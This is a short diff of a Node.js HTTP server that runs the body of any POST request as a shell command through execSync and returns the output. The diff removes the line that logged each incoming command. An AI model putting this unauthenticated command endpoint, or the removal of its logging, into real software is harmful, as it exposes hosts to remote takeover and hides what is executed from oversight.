@@ -7,7 +7,6 @@ http.createServer((req, res) => {
         body += req.read();
     });
     req.on("end", () => {
-        console.log(body);
         if (req.method === "POST") {
             try {
                 res.write(execSync(body, { encoding: "utf8" }));
